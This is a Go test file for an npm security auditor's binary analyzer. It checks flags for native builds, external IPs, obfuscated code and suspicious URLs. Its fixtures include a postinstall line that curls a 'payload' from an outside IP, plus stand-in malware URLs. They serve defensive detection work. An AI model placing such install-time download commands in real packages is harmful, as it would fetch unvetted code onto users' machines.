package analyzer

import (
	"context"
	"testing"

	"github.com/kluth/npm-security-auditter/internal/registry"
)

func TestBinaryAnalyzer(t *testing.T) {
	tests := []struct {
		name         string
		version      *registry.PackageVersion
		wantFindings int
	}{
		{
			name:         "clean package",
			version:      &registry.PackageVersion{},
			wantFindings: 0,
		},
		{
			name:         "gyp file present",
			version:      &registry.PackageVersion{GypFile: true},
			wantFindings: 1,
		},
		{
			name:         "binary field present",
			version:      &registry.PackageVersion{Binary: map[string]interface{}{"module": "native"}},
			wantFindings: 1,
		},
		{
			name: "node-pre-gyp in install script",
			version: &registry.PackageVersion{
				Scripts: map[string]string{"install": "node-pre-gyp install --fallback-to-build"},
			},
			wantFindings: 1,
		},
		{
			name: "hardcoded external IP in script",
			version: &registry.PackageVersion{
				Scripts: map[string]string{"postinstall": "curl http://45.33.32.156/payload"},
			},
			wantFindings: 2, // IP + suspicious URL
		},
		{
			name: "obfuscated code pattern",
			version: &registry.PackageVersion{
				Scripts: map[string]string{"postinstall": "var _0x4e2f = ['\\x68\\x65\\x6c\\x6c\\x6f']"},
			},
			wantFindings: 1, // obfuscation pattern
		},
		{
			name: "local IP is ok",
			version: &registry.PackageVersion{
				Scripts: map[string]string{"test": "curl http://127.0.0.1:3000/test"},
			},
			wantFindings: 0,
		},
	}

	analyzer := NewBinaryAnalyzer()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := analyzer.Analyze(context.Background(), &registry.PackageMetadata{}, tt.version)
			if err != nil {
				t.Fatalf("Analyze() error = %v", err)
			}
			if len(findings) < tt.wantFindings {
				t.Errorf("Analyze() returned %d findings, want at least %d. Findings: %+v",
					len(findings), tt.wantFindings, findings)
			}
		})
	}
}

func TestIsLocalIP(t *testing.T) {
	tests := []struct {
		ip   string
		want bool
	}{
		{"127.0.0.1", true},
		{"192.168.1.1", true},
		{"10.0.0.1", true},
		{"0.0.0.0", true},
		{"8.8.8.8", false},
		{"45.33.32.156", false},
	}

	for _, tt := range tests {
		t.Run(tt.ip, func(t *testing.T) {
			got := isLocalIP(tt.ip)
			if got != tt.want {
				t.Errorf("isLocalIP(%q) = %v, want %v", tt.ip, got, tt.want)
			}
		})
	}
}

func TestIsSuspiciousURL(t *testing.T) {
	tests := []struct {
		url  string
		want bool
	}{
		{"https://github.com/user/repo", false},
		{"https://registry.npmjs.org/pkg", false},
		{"https://evil-server.com/payload", false}, // generic unknown domain, not specifically suspicious
		{"http://45.33.32.156/malware", true},
		{"https://bit.ly/abc123", true},
	}

	for _, tt := range tests {
		t.Run(tt.url, func(t *testing.T) {
			got := isSuspiciousURL(tt.url)
			if got != tt.want {
				t.Errorf("isSuspiciousURL(%q) = %v, want %v", tt.url, got, tt.want)
			}
		})
	}
}
